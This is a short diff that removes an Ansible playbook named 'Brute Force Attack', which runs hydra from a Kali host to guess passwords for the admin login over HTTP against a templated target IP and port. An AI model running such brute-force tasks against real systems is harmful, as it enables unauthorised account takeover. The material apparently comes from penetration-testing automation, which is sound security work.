@@ -1,5 +1,0 @@
-- name: Brute Force Attack
-  hosts: kali
-  tasks:
-    - name: Run brute force
-      shell: hydra -l admin -P {{ wordlist }} -s {{ target_port }} {{ target_ip }} http-get
